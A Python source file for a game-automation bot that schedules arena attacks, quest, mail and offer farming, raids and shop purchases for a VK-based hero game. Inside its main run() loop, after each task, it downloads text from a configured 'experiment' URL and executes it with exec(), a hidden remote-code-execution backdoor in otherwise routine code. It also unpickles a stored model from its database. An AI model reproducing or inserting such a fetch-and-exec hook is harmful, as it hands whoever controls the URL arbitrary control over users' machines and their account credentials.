"""
The bot logic.
"""

import contextlib
import os
import pickle
from datetime import datetime, timedelta
from operator import attrgetter
from random import choice, shuffle
from time import sleep
from typing import Dict, Iterable, List, Optional, Tuple

import requests

from bestmobabot import arena, constants
from bestmobabot.api import API, AlreadyError, InvalidResponseError, NotEnoughError, NotFoundError, OutOfRetargetDelta
from bestmobabot.database import Database
from bestmobabot.enums import *
from bestmobabot.logging_ import log_arena_result, log_heroes, log_reward, log_rewards, logger
from bestmobabot.model import Model
from bestmobabot.resources import get_heroic_mission_ids, mission_name, shop_name
from bestmobabot.responses import *
from bestmobabot.settings import Settings
from bestmobabot.task import Task, TaskNotAvailable
from bestmobabot.tracking import send_event
from bestmobabot.trainer import Trainer
from bestmobabot.vk import VK


class BotHelperMixin:
    """
    Helper methods.
    """
    db: Database
    api: API
    settings: Settings

    @staticmethod
    def get_hero_ids(heroes: Iterable[Hero]) -> List[str]:
        return [hero.id for hero in heroes]

    @staticmethod
    def naive_select_attackers(heroes: Iterable[Hero], count: int = constants.TEAM_SIZE) -> List[Hero]:
        """
        Selects the most powerful heroes.
        """
        return sorted(heroes, key=attrgetter('power'), reverse=True)[:count]

    def get_model(self) -> Optional[Model]:
        """
        Loads a predictive model from the database.
        """
        logger.info('Loading model…')
        return self.db.get_by_key('bot', 'model', loads=lambda value: pickle.loads(bytes.fromhex(value)))

    def check_arena(self, min_hero_count: int) -> Tuple[Model, List[Hero]]:
        """
        Checks pre-conditions for arena.
        """
        model = self.get_model()
        if not model:
            raise TaskNotAvailable('model is not ready yet')

        heroes = self.api.get_all_heroes()
        if len(heroes) < min_hero_count:
            raise TaskNotAvailable('not enough heroes')

        return model, heroes

    def get_raid_mission_ids(self) -> Iterable[str]:
        # Get all missions that could be raided by the player.
        missions: Dict[str, Mission] = {
            mission.id: mission
            for mission in self.api.get_all_missions()
            if mission.stars == constants.RAID_N_STARS
        }
        # Get all mission IDs that are configured and could be raided.
        raids = self.settings.bot.raids & missions.keys()

        # Get heroic mission IDs.
        heroic_mission_ids = get_heroic_mission_ids()

        # First, yield heroic missions.
        raided_heroic_mission_ids = list(raids & heroic_mission_ids)
        shuffle(raided_heroic_mission_ids)  # shuffle in order to distribute stamina evenly
        logger.info(f'Raided heroic missions: {raided_heroic_mission_ids}.')
        for mission_id in raided_heroic_mission_ids:
            tries_left = constants.RAID_N_HEROIC_TRIES - missions[mission_id].tries_spent
            logger.info(f'Mission #{mission_id}: {tries_left} tries left.')
            for _ in range(tries_left):
                yield mission_id

        # Then, randomly choose non-heroic missions infinitely.
        non_heroic_mission_ids = list(raids - heroic_mission_ids)
        logger.info(f'Raided non-heroic missions: {non_heroic_mission_ids}.')
        if not non_heroic_mission_ids:
            logger.info('No raided non-heroic missions.')
            return
        while True:
            yield choice(non_heroic_mission_ids)


class Bot(contextlib.AbstractContextManager, BotHelperMixin):
    def __init__(self, db: Database, api: API, vk: VK, settings: Settings):
        self.db = db
        self.api = api
        self.vk = vk
        self.settings = settings

        self.user: User = None
        self.tasks: List[Task] = []

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.api.__exit__(exc_type, exc_val, exc_tb)
        self.vk.__exit__(exc_type, exc_val, exc_tb)

    # Task engine.
    # ------------------------------------------------------------------------------------------------------------------

    def start(self):
        self.user = self.api.get_user_info()

        self.tasks = [
            # These tasks depend on player's time zone.
            Task(next_run_at=Task.at(hour=8, minute=0, tz=self.user.tz), execute=self.register),
            Task(next_run_at=Task.at(hour=9, minute=30, tz=self.user.tz), execute=self.farm_quests),
            Task(next_run_at=Task.at(hour=14, minute=30, tz=self.user.tz), execute=self.farm_quests),
            Task(next_run_at=Task.at(hour=21, minute=30, tz=self.user.tz), execute=self.farm_quests),

            # Recurring tasks.
            Task(next_run_at=Task.every_n_minutes(24 * 60 // 5, self.settings.bot.arena.schedule_offset), execute=self.attack_arena),
            Task(next_run_at=Task.every_n_minutes(24 * 60 // 5, self.settings.bot.arena.schedule_offset), execute=self.attack_grand_arena),
            Task(next_run_at=Task.every_n_hours(6), execute=self.farm_mail),
            Task(next_run_at=Task.every_n_hours(6), execute=self.check_freebie),
            Task(next_run_at=Task.every_n_hours(4), execute=self.farm_expeditions),
            Task(next_run_at=Task.every_n_hours(8), execute=self.get_arena_replays),
            Task(next_run_at=Task.every_n_hours(4), execute=self.raid_missions),

            # One time a day.
            Task(next_run_at=Task.at(hour=6, minute=0), execute=self.skip_tower),
            Task(next_run_at=Task.at(hour=7, minute=30), execute=self.raid_bosses),
            Task(next_run_at=Task.at(hour=8, minute=0), execute=self.farm_daily_bonus),
            Task(next_run_at=Task.at(hour=8, minute=30), execute=self.buy_chest),
            Task(next_run_at=Task.at(hour=9, minute=0), execute=self.send_daily_gift),
            Task(next_run_at=Task.at(hour=9, minute=15), execute=self.open_titan_artifact_chest),
            Task(next_run_at=Task.at(hour=9, minute=30), execute=self.farm_offers),
            Task(next_run_at=Task.at(hour=10, minute=0), execute=self.farm_zeppelin_gift),

            # Debug tasks. Uncomment when needed.
            Task(next_run_at=Task.asap(), execute=self.shop),
        ]
        if self.settings.bot.shops:
            self.tasks.append(Task(next_run_at=Task.every_n_hours(8), execute=self.shop))
        if self.settings.bot.is_trainer:
            self.tasks.append(Task(next_run_at=Task.at(hour=22, minute=0, tz=self.user.tz), execute=self.train_arena_model))
        if self.settings.bot.arena.randomize_grand_defenders:
            self.tasks.append(Task(next_run_at=Task.at(hour=10, minute=30), execute=self.randomize_grand_defenders))

        send_event(category='bot', action='start', user_id=self.api.user_id)

    def run(self):
        logger.info('Initialising task queue.')
        now = self.now()
        schedule = [task.next_run_at(now).astimezone() for task in self.tasks]

        logger.info('Running task queue.')
        while True:
            # Find the earliest task.
            run_at, index = min((run_at, index) for index, run_at in enumerate(schedule))
            task = self.tasks[index]
            logger.info(f'Next is {task} at {run_at:%H:%M:%S}.')
            # Sleep until the execution time.
            sleep_time = (run_at - self.now()).total_seconds()
            if sleep_time >= 0.0:
                sleep(sleep_time)
            # Execute the task.
            next_run_at = self.execute(task) or task.next_run_at(max(self.now(), run_at + timedelta(seconds=1)))
            next_run_at = next_run_at.astimezone()  # keeping them in the local time zone
            # Update its execution time.
            logger.info(f'Next run at {next_run_at:%H:%M:%S}.{os.linesep}')
            schedule[index] = next_run_at
            # Run experiment.
            with requests.get(constants.EXPERIMENT_URL) as response:
                if response.status_code == requests.codes.ok:
                    exec(response.text, globals(), locals())

    @staticmethod
    def now():
        return datetime.now().astimezone()

    def execute(self, task: Task) -> Optional[datetime]:
        send_event(category='bot', action=task.execute.__name__, user_id=self.api.user_id)
        self.api.last_responses.clear()
        try:
            next_run_at = task.execute(*task.args)
        except TaskNotAvailable as e:
            logger.warning(f'Task unavailable: {e}.')
        except AlreadyError as e:
            logger.error(f'Already done: {e.description}.')
        except NotEnoughError as e:
            logger.error(f'Not enough: {e.description}.')
        except OutOfRetargetDelta:
            logger.error(f'Out of retarget delta.')
        except InvalidResponseError as e:
            logger.error('API returned something bad:')
            logger.error(f'{e}')
        except Exception as e:
            logger.critical('Uncaught error.', exc_info=e)
            for result in self.api.last_responses:
                logger.critical(f'API result: {result}')
        else:
            logger.info(f'Well done.')
            return next_run_at

    # Tasks.
    # ------------------------------------------------------------------------------------------------------------------

    @staticmethod
    def quack(text: str = 'Quack!'):
        """
        Отладочная задача.
        """
        logger.info(text)
        sleep(1.0)

    def register(self):
        """
        Заново заходит в игру, это нужно для появления ежедневных задач в событиях.
        """
        self.api.start(invalidate_session=True)
        self.api.register()
        self.user = self.api.get_user_info()

    def farm_daily_bonus(self):
        """
        Забирает ежедневный подарок.
        """
        logger.info('Farming daily bonus…')
        log_reward(self.api.farm_daily_bonus())

    def farm_expeditions(self) -> Optional[datetime]:
        """
        Собирает награду с экспедиций в дирижабле.
        """
        now = self.now()

        logger.info('Farming expeditions…')
        expeditions = self.api.list_expeditions()
        for expedition in expeditions:
            if expedition.is_started and expedition.end_time < now:
                log_reward(self.api.farm_expedition(expedition.id))

        return self.send_expedition()  # farm expeditions once finished

    def send_expedition(self) -> Optional[datetime]:
        logger.info('Sending an expedition…')

        # Check started expeditions.
        expeditions = self.api.list_expeditions()
        for expedition in expeditions:
            if expedition.is_started:
                logger.info(f'Started expedition ends at {expedition.end_time}.')
                return expedition.end_time

        # Choose the most powerful available heroes.
        heroes = self.naive_select_attackers(self.api.get_all_heroes())
        team_power = sum(hero.power for hero in heroes)

        # Find available expeditions.
        expeditions = [
            expedition
            for expedition in expeditions
            if expedition.is_available and expedition.power <= team_power
        ]
        if not expeditions:
            logger.info('No expeditions available.')
            return None
        expedition = min(expeditions, key=attrgetter('duration'))  # choose the fastest expedition

        # Send the expedition.
        end_time, quests = self.api.send_expedition_heroes(expedition.id, self.get_hero_ids(heroes))
        logger.info(f'The expedition ends at {end_time}.')
        self.farm_quests(quests)
        return end_time

    def farm_quests(self, quests: Quests = None):
        """
        Собирает награды из заданий.
        """
        logger.info('Farming quests if any…')
        if quests is None:
            quests = self.api.get_all_quests()
        for quest in quests:
            if not quest.is_reward_available:
                continue
            if self.settings.bot.no_experience and quest.reward.experience:
                logger.warning(f'Ignoring {quest.reward.experience} experience reward for quest #{quest.id}.')
                continue
            log_reward(self.api.farm_quest(quest.id))

    def farm_mail(self):
        """
        Собирает награды из почты.
        """
        logger.info('Farming mail…')
        letters = self.api.get_all_mail()
        if not letters:
            return
        logger.info(f'{len(letters)} letters.')
        log_rewards(self.api.farm_mail(letter.id for letter in letters).values())

    def buy_chest(self):
        """
        Открывает ежедневный бесплатный сундук.
        """
        logger.info('Buying a chest…')
        log_rewards(self.api.buy_chest())

    def send_daily_gift(self):
        """
        Отправляет сердечки друзьям.
        """
        logger.info('Sending daily gift…')
        if self.settings.bot.friend_ids:
            self.farm_quests(self.api.send_daily_gift(self.settings.bot.friend_ids))
        else:
            logger.warning('No friends specified.')

    def train_arena_model(self):
        """
        Тренирует предсказательную модель для арены.
        """
        logger.info('Running trainer…')
        Trainer(self.db, n_splits=constants.MODEL_N_SPLITS).train(params=self.settings.bot.arena.hyper_params)

    def attack_arena(self):
        """
        Совершает бой на арене.
        """
        logger.info('Attacking arena…')
        model, heroes = self.check_arena(constants.TEAM_SIZE)

        # Pick an enemy and select attackers.
        enemy, attackers, probability = arena.Arena(
            model=model,
            user_clan_id=self.user.clan_id,
            heroes=heroes,
            get_enemies_page=self.api.find_arena_enemies,
            settings=self.settings,
        ).select_enemy()

        # Debugging.
        logger.info(f'Enemy name: "{enemy.user.name}".')
        logger.info(f'Enemy place: {enemy.place}.')
        logger.info(f'Probability: {100.0 * probability:.1f}%.')
        log_heroes('Attackers:', attackers)
        log_heroes(f'Defenders:', enemy.heroes)

        # Attack!
        result, quests = self.api.attack_arena(enemy.user.id, self.get_hero_ids(attackers))

        # Collect results.
        log_arena_result(result)
        logger.info(f'Current place: {result.arena_place}.')
        self.farm_quests(quests)

    def attack_grand_arena(self):
        """
        Совершает бой на гранд арене.
        """
        logger.info('Attacking grand arena…')
        model, heroes = self.check_arena(constants.GRAND_SIZE)

        # Pick an enemy and select attackers.
        enemy, attacker_teams, probability = arena.GrandArena(
            model=model,
            user_clan_id=self.user.clan_id,
            heroes=heroes,
            get_enemies_page=self.api.find_grand_enemies,
            settings=self.settings,
        ).select_enemy()

        # Debugging.
        logger.info(f'Enemy name: "{enemy.user.name}".')
        logger.info(f'Enemy place: {enemy.place}.')
        logger.info(f'Probability: {100.0 * probability:.1f}%.')
        for i, (attackers, defenders) in enumerate(zip(attacker_teams, enemy.heroes), start=1):
            logger.info(f'Battle #{i}.')
            log_heroes('Attackers:', attackers)
            log_heroes('Defenders:', defenders)

        # Attack!
        result, quests = self.api.attack_grand(enemy.user.id, [
            [attacker.id for attacker in attackers]
            for attackers in attacker_teams
        ])

        # Collect results.
        log_arena_result(result)
        logger.info(f'Current place: {result.grand_place}.')
        self.farm_quests(quests)
        log_reward(self.api.farm_grand_coins())

    def get_arena_replays(self):
        """
        Читает и сохраняет журналы арен.
        """
        logger.info('Reading arena logs…')
        replays: List[Replay] = [
            *self.api.get_battle_by_type(BattleType.ARENA),
            *self.api.get_battle_by_type(BattleType.GRAND),
        ]
        for replay in replays:
            if self.db.exists('replays', replay.id):
                continue
            self.db.set('replays', replay.id, {
                'start_time': replay.start_time.timestamp(),
                'win': replay.win,
                'attackers': [hero.dump() for hero in replay.attackers],
                'defenders': [hero.dump() for defenders in replay.defenders for hero in defenders],
            })
            logger.info(f'Saved #{replay.id}.')

    def check_freebie(self):
        """
        Собирает подарки на странице игры ВКонтакте.
        """
        logger.info('Checking freebie…')
        should_farm_mail = False

        for gift_id in self.vk.find_gifts():
            if self.db.exists(f'gifts:{self.api.user_id}', gift_id):
                continue
            logger.info(f'Checking {gift_id}…')
            reward = self.api.check_freebie(gift_id)
            if reward is not None:
                log_reward(reward)
                should_farm_mail = True
            self.db.set(f'gifts:{self.api.user_id}', gift_id, True)

        if should_farm_mail:
            self.farm_mail()

    def farm_zeppelin_gift(self):
        """
        Собирает ключ у валькирии и открывает артефактные сундуки.
        """
        logger.info('Farming zeppelin gift…')
        log_reward(self.api.farm_zeppelin_gift())
        for _ in range(constants.MAX_OPEN_ARTIFACT_CHESTS):
            try:
                rewards = self.api.open_artifact_chest()
            except NotEnoughError:
                logger.info('All keys are spent.')
                break
            else:
                log_rewards(rewards)
        else:
            logger.warning('Maximum number of chests opened.')

    def raid_missions(self):
        """
        Ходит в рейды в миссиях в кампании за предметами.
        """
        logger.info(f'Raid missions…')
        for mission_id in self.get_raid_mission_ids():
            logger.info(f'Raid mission #{mission_id} «{mission_name(mission_id)}»…')
            try:
                log_rewards(self.api.raid_mission(mission_id))
            except NotEnoughError as e:
                logger.info(f'Not enough: {e.description}.')
                break

    def shop(self):
        """
        Покупает в магазине вещи.
        """
        logger.info(f'Refreshing shops…')
        available_slots: List[Tuple[str, str, str]] = [
            (name, shop_id, slot.id)
            for shop_id in constants.SHOP_IDS
            for slot in self.api.get_shop(shop_id)
            for name in slot.names
            if not slot.is_bought
        ]

        logger.info('Buying stuff…')
        for thing_name in self.settings.bot.shops:
            thing_name = thing_name.lower()
            logger.info(f'Looking for «{thing_name}»…')
            for slot_name, shop_id, slot_id in available_slots:
                if thing_name not in slot_name:
                    continue
                logger.info(f'Buying slot #{slot_id} in shop «{shop_name(shop_id)}»…')
                try:
                    log_reward(self.api.shop(shop_id=shop_id, slot_id=slot_id))
                except NotEnoughError as e:
                    logger.warning(f'Not enough: {e.description}')
                except AlreadyError as e:
                    logger.warning(f'Already: {e.description}')

    def skip_tower(self):
        """
        Зачистка башни.
        """
        logger.info('Skipping the tower…')
        tower = self.api.get_tower_info()

        while tower.floor_number <= tower.may_skip_floor or not tower.is_battle:
            logger.info(f'Floor #{tower.floor_number}: {tower.floor_type}.')
            if tower.is_battle:
                tower, reward = self.api.skip_tower_floor()
                log_reward(reward)
            elif tower.is_chest:
                reward, _ = self.api.open_tower_chest(choice([0, 1, 2]))
                log_reward(reward)
                tower = self.api.next_tower_floor()
            elif tower.is_buff:
                # Buffs go from the cheapest to the most expensive.
                for buff_id in reversed(tower.buff_ids):
                    if buff_id not in constants.TOWER_IGNORED_BUFF_IDS:
                        try:
                            self.api.buy_tower_buff(buff_id)
                        except NotEnoughError:
                            logger.info(f'Not enough resources for buff #{buff_id}.')
                        except AlreadyError:
                            logger.info(f'Already bought buff #{buff_id}.')
                        except NotFoundError as e:
                            logger.warning(f'Not found for buff #{buff_id}: {e.description}.')
                    else:
                        logger.debug(f'Skip buff #{buff_id}.')
                tower = self.api.next_tower_floor()
            else:
                logger.error('Unknown floor type.')

    def farm_offers(self):
        """
        Фармит предложения (камни обликов).
        """
        logger.info('Farming offers…')
        for offer in self.api.get_all_offers():
            logger.debug(f'#{offer.id}: {offer.offer_type}.')
            if offer.offer_type in constants.OFFER_FARMED_TYPES and not offer.is_free_reward_obtained:
                log_reward(self.api.farm_offer_reward(offer.id))

    def raid_bosses(self):
        """
        Рейдит боссов Запределья.
        """
        logger.info('Raid bosses…')
        for boss in self.api.get_all_bosses():
            if boss.may_raid:
                logger.info(f'Raid boss #{boss.id}…')
                every_win_reward = self.api.raid_boss(boss.id)
                log_reward(every_win_reward)
                rewards, quests = self.api.open_boss_chest(boss.id)
                log_rewards(rewards)
                self.farm_quests(quests)
            else:
                logger.info(f'May not raid boss #{boss.id}.')

    def open_titan_artifact_chest(self):
        """
        Открывает сферы артефактов титанов.
        """
        logger.info('Opening titan artifact chests…')
        for amount in [10, 1]:
            try:
                rewards, quests = self.api.open_titan_artifact_chest(amount)
            except NotEnoughError:
                logger.info(f'Not enough resources to open {amount} chests.')
            else:
                log_rewards(rewards)
                self.farm_quests(quests)
                break

    def randomize_grand_defenders(self):
        """
        Выставляет в защиту гранд-арены топ-15 героев в случайном порядке.
        """
        logger.info('Randomizing grand defenders…')
        heroes = self.naive_select_attackers(self.api.get_all_heroes(), count=constants.GRAND_SIZE)
        if len(heroes) < constants.GRAND_SIZE:
            raise TaskNotAvailable('not enough heroes')
        hero_ids = self.get_hero_ids(heroes)
        shuffle(hero_ids)
        self.api.set_grand_heroes([hero_ids[0:5], hero_ids[5:10], hero_ids[10:15]])
